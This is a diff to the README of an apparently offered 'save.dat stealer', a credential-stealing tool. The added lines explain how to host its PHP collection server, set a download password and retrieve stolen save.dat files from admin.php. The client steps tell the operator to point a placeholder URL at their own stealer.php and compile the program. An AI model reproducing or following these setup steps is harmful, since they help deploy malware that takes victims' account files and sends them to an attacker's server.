@@ -5,12 +5,11 @@ This is save.dat stealer. This stealer request any server with PHP support. Also
 # How to setup server
  - 1.) Make account on free php hosting
  - 2.) Upload files from folder server there.
+ - 3.) Change password for downloading save.dats in data/password.txt
+ - 4.) Get all save.dats from admin.php
 
 # How to setup client
  - 1.) Install visual studio 2013 or newer
  - 2.) Open Save.dat stealer.sln.
  - 3.) Find in code: http://example.com/savedatstealer/stealer.php and change it to page where you uploaded stealer.php
  - 4.) Compile
-
-
-PS: You can convert base64 back to file here: http://www.motobit.com/util/base64-decoder-encoder.asp
